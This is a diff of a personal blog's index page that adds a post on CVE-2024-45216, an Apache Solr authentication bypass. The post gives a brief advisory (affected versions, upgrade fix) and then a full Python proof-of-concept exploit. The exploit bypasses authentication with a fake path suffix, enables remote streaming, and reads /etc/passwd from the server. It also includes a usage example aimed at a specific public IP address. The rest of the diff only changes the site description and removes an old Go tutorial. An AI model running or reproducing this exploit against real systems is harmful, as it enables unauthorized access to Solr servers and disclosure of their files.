@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash">
+  <meta name="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
 <meta property="og:type" content="website">
 <meta property="og:title" content="congdong007">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="congdong007">
-<meta property="og:description" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash">
+<meta property="og:description" content="bW9ua2V5Y2RAZ21haWwuY29t">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Dong Cong">
 <meta property="article:tag" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash、Penetration Tester">
@@ -158,12 +158,113 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/01/vuln-CVE-2024-45216/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/12/01/vuln-CVE-2024-45216/" class="post-title-link" itemprop="url">Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 ) poc</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-12-01 16:19:57 / Modified: 17:33:35" itemprop="dateCreated datePublished" datetime="2024-12-01T16:19:57-05:00">2024-12-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability/Apache-Solr/" itemprop="url" rel="index"><span itemprop="name">Apache Solr</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnerability/Apache-Solr/CVE-2024-45216/" itemprop="url" rel="index"><span itemprop="name">CVE-2024-45216</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <pre><code>Description
+    An Improper Authentication vulnerability exists in Apache Solr, affecting versions:
+
+        From 5.3.0 to versions before 8.11.4
+            From 9.0.0 to versions before 9.7.0
+    This vulnerability occurs when the PKIAuthenticationPlugin (enabled by default with Solr Authentication) allows for an authentication bypass. By appending a &quot;fake ending&quot; to the end of a Solr API URL path, malicious requests can bypass authentication. The fake path resembles an unprotected API endpoint, but it is stripped internally after authentication and before API routing, maintaining the appearance of a valid API URL.
+
+Impact
+    This vulnerability allows unauthorized access to sensitive Solr APIs, potentially compromising system integrity and exposing data.
+
+Solution
+    Users should upgrade to:
+
+        Version 9.7.0 (for 9.x series)
+        Version 8.11.4 (for 8.x series)
+
+    These versions address and fix the issue.
+
+Proof of Concept (Python Code)
+    
+    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 )</span></span><br><span class="line"><span class="comment"># Date : 2024-12-01</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE : 2024-45216</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import argparse</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&#x27;/solr/admin/cores:/admin/info/key?indexInfo=false&amp;wt=json&#x27;</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;/solr/&#123;&#125;/config:/admin/info/key&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;/solr/&#123;&#125;/debug/dump:/admin/info/key?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser=argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input the vulnerable host&quot;</span>, <span class="built_in">type</span>=str)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://xx.xx.xx.xx:8983</span></span><br><span class="line">host = args.host</span><br><span class="line"><span class="built_in">print</span>(host)</span><br><span class="line"></span><br><span class="line">headers1 = &#123;</span><br><span class="line">    <span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params1 = &#123;</span><br><span class="line">    <span class="string">&#x27;indexInfo&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wt&#x27;</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers2 = &#123;</span><br><span class="line">    <span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers3 = &#123;</span><br><span class="line"><span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line"><span class="comment"># &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;set-property&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;requestDispatcher.requestParsers.enableRemoteStreaming&#x27;</span>: True,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    response = requests.post(</span><br><span class="line">        f<span class="string">&#x27;&#123;host&#125;&#123;url0&#125;&#x27;</span>,</span><br><span class="line">        params=params1,</span><br><span class="line">        headers=headers1,</span><br><span class="line">        <span class="built_in">timeout</span>=10</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200 and <span class="string">&quot;application/json&quot;</span> <span class="keyword">in</span> response.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;&#123;host&#125; ---&gt; &#123;len(response.text)&#125; \n\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n&#x27;</span> + <span class="string">&#x27;*&#x27;</span>*78 + <span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        data1 = None</span><br><span class="line">        data1 = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data1 != None:</span><br><span class="line"></span><br><span class="line">            status_data = data1.get(<span class="string">&quot;status&quot;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> core_name, core_details <span class="keyword">in</span> status_data.items():</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Core Name: &#123;core_name&#125;&quot;</span>)</span><br><span class="line">                temp_url = url1.format(core_name)</span><br><span class="line"></span><br><span class="line">                response = requests.post(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125;&#x27;</span>, headers=headers2, json=json_data,<span class="built_in">timeout</span>=10)                    </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> response.status_code == 200 and len(response.text) &lt; 200:</span><br><span class="line">                    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125; ---&gt; &#123;len(response.text)&#125; \n\n&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(response.text)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n&#x27;</span> +<span class="string">&#x27;*&#x27;</span>*78 + <span class="string">&#x27;\n\n\n&#x27;</span>)                        </span><br><span class="line"></span><br><span class="line">                    temp_url = url2.format(core_name)</span><br><span class="line"></span><br><span class="line">                    response = requests.post(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125;&#x27;</span>, headers=headers2,<span class="built_in">timeout</span>=10)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">                        </span><br><span class="line">                        <span class="built_in">print</span>(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125; ---&gt; &#123;len(response.text)&#125; \n\n&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(response.text)                        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">except requests.exceptions.HTTPError as http_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;HTTP 错误: &#123;http_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.ConnectionError as conn_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;连接错误: &#123;conn_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.Timeout as timeout_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;请求超时: &#123;timeout_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.RequestException as req_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;请求错误: &#123;req_err&#125;&quot;) </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+The following code demonstrates how to execute the script:
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py --host http://122.51.176.242:8983</span><br></pre></td></tr></table></figure>
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/12/vuln-handlink/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -257,7 +358,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -351,7 +452,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -461,7 +562,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -575,7 +676,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -666,7 +767,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -759,7 +860,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -844,7 +945,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -937,7 +1038,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1021,104 +1122,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2018/11/16/goFunc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/11/16/goFunc/" class="post-title-link" itemprop="url">A Brief Summary of "go func()"</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-11-16 23:00:34" itemprop="dateCreated datePublished" datetime="2018-11-16T23:00:34-05:00">2018-11-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-23 10:48:54" itemprop="dateModified" datetime="2023-10-23T10:48:54-04:00">2023-10-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Go/go-func/" itemprop="url" rel="index"><span itemprop="name">go func()</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong><em>“go func()”</em></strong> is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a lightweight thread in Go used for concurrent task execution. Using <strong><em>“go func()”</em></strong> allows you to create new concurrent execution flows in your program without the need to explicitly create threads or manage the complexity of thread management.</p>
-<p>Here is a basic example and some key concepts of using <strong><em>“go func()”</em></strong>:</p>
-<p>Basic Example:</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Place the code you want to execute in a new concurrent goroutine here</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The main goroutine continues to execute other work</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>In the example above, <strong><em>“go func()”</em></strong> starts a concurrent goroutine for an anonymous function, which will execute the code inside it. The main goroutine continues to execute other tasks, while the new concurrent goroutine runs in the background.</p>
-<p>Key Concepts:</p>
-<ol>
-<li><p><strong><em>Anonymous Function</em></strong>: Anonymous functions are typically used to define <strong><em>“go func()”</em></strong> because there’s no need to name the concurrent goroutine. The code for the anonymous function can be enclosed in {} as needed.</p>
-</li>
-<li><p><strong><em>Concurrent Execution</em></strong>: Goroutines launched with <strong><em>“go func()”</em></strong> run concurrently in the background without blocking the main program’s execution. This allows you to execute multiple tasks simultaneously, improving program performance.</p>
-</li>
-<li><p><strong><em>Data Sharing</em></strong>: Concurrent goroutines can share data, but it’s important to handle shared data carefully to avoid race conditions and data races. You can use tools provided by the “sync” package to manage access to shared data.</p>
-</li>
-<li><p><strong><em>Goroutine Management</em></strong>: Go’s runtime system is responsible for creating, scheduling, and destroying goroutines. You don’t need to worry about the complexity of thread creation and destruction.</p>
-</li>
-<li><p><strong><em>Waiting for Goroutines to Complete</em></strong>: If you need to wait for concurrent goroutines to finish, you can use mechanisms like “sync.WaitGroup” or channels to implement waiting.</p>
-</li>
-</ol>
-<p>Using <strong><em>“go func()”</em></strong> is a simple way to achieve concurrency in the Go programming language, allowing you to run tasks in parallel, such as handling concurrent requests, performing background tasks, or other work that needs to execute simultaneously. However, be cautious about handling concurrency issues and ensuring that shared data is synchronized and accessed correctly.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1183,26 +1186,26 @@
     <img class="site-author-image" itemprop="image" alt="Dong Cong"
       src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">Dong Cong</p>
-  <div class="site-description" itemprop="description">Python、Typescript、Go、C/C++、asm、Bash</div>
+  <div class="site-description" itemprop="description">bW9ua2V5Y2RAZ21haWwuY29t</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-count">61</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-count">20</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
